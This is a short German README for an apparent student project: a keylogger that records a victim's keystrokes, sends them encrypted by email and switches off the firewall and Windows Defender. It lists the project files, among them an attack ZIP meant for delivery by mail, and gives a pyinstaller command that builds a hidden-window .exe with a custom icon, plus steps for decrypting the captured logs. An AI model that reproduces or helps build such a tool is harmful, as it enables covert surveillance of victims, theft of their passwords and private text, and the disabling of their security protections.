**Sportferien-Project**

## Was habe ich gemacht?
Ich habe einen Keylogger der die Keystrokes von dem Betroffenen speichert,    
dir per Mail Verschlüsselt sendet und die Firewall + den Defender deaktiviert.  
Du kannst dies entschlüsseln indem du den  
verschlüsselten Text in das Feld <Hier kommt der ...> rein kopierst und mit  
folgendem Command startest:  

`python <Dateiname.py>`  

## Beeinhaltete Dateien
`key.key` --> Der Schlüssel zum entshlüsseln  
`keylogger.exe` --> Das eigentliche Programm das gestartet wird.  
`keylogger.py` --> Das Keylogger Programm  
`keylogger_Entschlüsselung.py` --> Das entschlüsselungs Programm  
`AttackeKeyloggerZIP.zip` --> Die Attacke (z.B. per Mail)  

## .py zu .exe kompilieren
Du kannst im Powershell eine .py Datei in eine .exe machen indem du folgenden Command eingibst:  
`pyinstaller --clean -w -F keyloggerTEST1.py --icon=icon.ico`   
-w → Windowed Mode (kein sichtbares Terminal-Fenster)  
-F → Single File (eine einzelne .exe-Datei)  
keylogger.py → Python-Skript, das kompiliert wird  
--icon=icon.ico → setzt ein benutzerdefiniertes Icon für die .exe-Datei

